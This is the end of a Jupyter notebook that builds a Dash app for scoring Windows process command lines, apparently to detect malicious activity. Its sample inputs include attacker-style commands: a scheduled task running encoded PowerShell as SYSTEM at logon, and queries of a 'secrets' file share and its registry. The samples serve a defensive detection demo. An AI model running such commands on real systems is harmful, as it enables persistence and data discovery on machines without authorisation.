    "+ C:\\Windows\\system32\\dllhost.exe /Processid:{B2FEB3AD-8AE6-42E7-B2E4-60609573B404}\n",
    "+ C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s SENS \n",
    "+ C:\\Windows\\System32\\Upfc.exe /launchtype boot /cv 09o3CnnAskG8AMTNUwkQhQ.0\n",
    "### Example logs not in dataset\n",
    "+ cmd.exe /c schtasks /create /tn \"Resume Viewer Update Checker\" /tr \"powershell.exe -nop -exec bypass -EncodedCommand $pcode\" /sc ONLOGON /RU SYSTEM'\n",
    "+ cmd.exe /c dir /s /b \\\\\\\\FILE001\\\\secrets\n",
    "+ C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" -nop -exec bypass -EncodedCommand SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQA\n",
    "+ cmd.exe /c reg query \"\\\\\\\\\\\\\\\\FILE001\\\\secrets\\\\hklm\\\\system\\\\currentcontrolset\\\\control\\\\terminal server\n",
    "'''\n",
    "\n",
    "app.layout = html.Div([\n",
    "    html.Div([\n",
    "        html.Div([\n",
    "            dcc.Markdown(children=markdown_text),\n",
    "            dcc.Textarea(id='input', value='C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc', style={'height': '50px', 'width': '50%'}),\n",
    "            \n",
    "        html.Div([html.Button(children='Submit', id='button', n_clicks=0)], style={'margin': '2px'}),\n",
    "            \n",
    "        html.Div([\n",
    "            dcc.Textarea(id='output', value='', style={'height': '175px', 'width': '50%'}),\n",
    "            dcc.Textarea(id='coefs', value='', style={'height': '175px', 'width': '25%'})\n",
    "        ]),\n",
    "            dcc.Markdown(children=sample_input_data)\n",
    "        ])\n",
    "    ])\n",
    "])\n",
    "    \n",
    "@app.callback(\n",
    "    [Output(component_id='output', component_property='value'),  # set output component on reactive change\n",
    "    Output(component_id='coefs', component_property='value')],\n",
    "    [Input(component_id='button', component_property='n_clicks')],  #  reactive input comes from button press\n",
    "    [dash.dependencies.State('input', 'value')]\n",
    ")\n",
    "def on_click(n_clicks, value):\n",
    "    # call pyspark logic from here\n",
    "    return spark_code(value)\n",
    "    \n",
    "\n",
    "viewer.show(app)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
